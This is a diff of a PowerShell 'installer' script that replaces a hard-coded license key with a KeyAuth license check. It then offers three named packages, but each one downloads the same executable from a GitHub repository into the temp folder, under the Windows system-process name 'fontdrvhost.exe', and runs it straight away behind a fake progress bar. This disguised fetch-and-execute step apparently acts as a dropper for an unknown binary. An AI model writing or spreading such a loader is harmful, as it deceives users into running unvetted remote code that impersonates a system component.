@@ -1,7 +1,13 @@
 Clear-Host
+[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
+
+# ===== KEYAUTH CONFIG =====
+$appname = "YOUR_APP_NAME"
+$ownerid = "YOUR_OWNER_ID"
+$secret  = "YOUR_SECRET"
+$version = "1.0"
 
 # ===== CONFIG =====
-$ValidKey = "smithshop"
 $ExeURL = "https://github.com/draft7973-ops/Smithshop/raw/main/fontdrvhost.exe"
 $ExeOutput = "$env:TEMP\fontdrvhost.exe"
 
@@ -15,14 +21,12 @@ function Show-Loading($text) {
         $dots = "." * ($i % 6)
         $color = $colors[$i % $colors.Count]
 
-        # progress bar
         $barLength = 20
         $filled = [math]::Floor($i / (100 / $barLength))
         $bar = ("█" * $filled).PadRight($barLength, "░")
 
         Write-Host "`r$text$dots [$bar] $i% " -NoNewline -ForegroundColor $color
-
-        Start-Sleep -Milliseconds 50
+        Start-Sleep -Milliseconds 40
     }
 
     Write-Host ""
@@ -39,50 +43,68 @@ if ($choice -eq "1") {
 
     $userKey = Read-Host "Enter your Key"
 
-    if ($userKey.Trim().ToLower() -eq $ValidKey.ToLower()) {
-
-        # 🔁 LOOP
-        while ($true) {
-
-            Clear-Host
-            Write-Host "=== SELECT CMD ===`n"
-            Write-Host "1. smithx3d"
-            Write-Host "2. uptoking"
-            Write-Host "3. kingsmith"
-            Write-Host "0. Exit"
-
-            $package = Read-Host "Choose 1 / 2 / 3 / 0"
-
-            switch ($package) {
-                "1" { $pkgName = "smithx3d" }
-                "2" { $pkgName = "uptoking" }
-                "3" { $pkgName = "kingsmith" }
-                "0" { break }
-                default {
-                    Write-Host "❌ Invalid!" -ForegroundColor Red
-                    Start-Sleep 1
-                    continue
-                }
-            }
-
-            # ===== INSTALL CMD =====
-            Clear-Host
-            Write-Host "=== INSTALL MODE ===`n"
-
-            Show-Loading "install $pkgName "
-
-            # โหลดไฟล์
-            Invoke-WebRequest $ExeURL -OutFile $ExeOutput
-
-            # รัน
-            Start-Process $ExeOutput
-
-            Write-Host "`n✅ install $pkgName success!" -ForegroundColor Green
-            Start-Sleep 2
+    # ===== 🔐 KEYAUTH CHECK =====
+    try {
+        $body = @{
+            type    = "license"
+            key     = $userKey
+            name    = $appname
+            ownerid = $ownerid
+            version = $version
         }
 
-    } else {
-        Write-Host "❌ Key invalid!" -ForegroundColor Red
+        $response = Invoke-RestMethod -Uri "https://keyauth.win/api/1.2/" -Method Post -Body $body
+
+        if ($response.success -ne $true) {
+            Write-Host "❌ Key invalid!" -ForegroundColor Red
+            Pause
+            exit
+        }
+
+        Write-Host "✅ Key valid!" -ForegroundColor Green
+        Start-Sleep 1
+
+    } catch {
+        Write-Host "❌ Connection error!" -ForegroundColor Red
+        Pause
+        exit
+    }
+
+    # 🔁 LOOP
+    while ($true) {
+
+        Clear-Host
+        Write-Host "=== SELECT CMD ===`n"
+        Write-Host "1. smithx3d"
+        Write-Host "2. uptoking"
+        Write-Host "3. kingsmith"
+        Write-Host "0. Exit"
+
+        $package = Read-Host "Choose 1 / 2 / 3 / 0"
+
+        switch ($package) {
+            "1" { $pkgName = "smithx3d" }
+            "2" { $pkgName = "uptoking" }
+            "3" { $pkgName = "kingsmith" }
+            "0" { break }
+            default {
+                Write-Host "❌ Invalid!" -ForegroundColor Red
+                Start-Sleep 1
+                continue
+            }
+        }
+
+        # ===== INSTALL CMD =====
+        Clear-Host
+        Write-Host "=== INSTALL MODE ===`n"
+
+        Show-Loading "install $pkgName "
+
+        Invoke-WebRequest $ExeURL -OutFile $ExeOutput
+        Start-Process $ExeOutput
+
+        Write-Host "`n✅ install $pkgName success!" -ForegroundColor Green
+        Start-Sleep 2
     }
 
 }
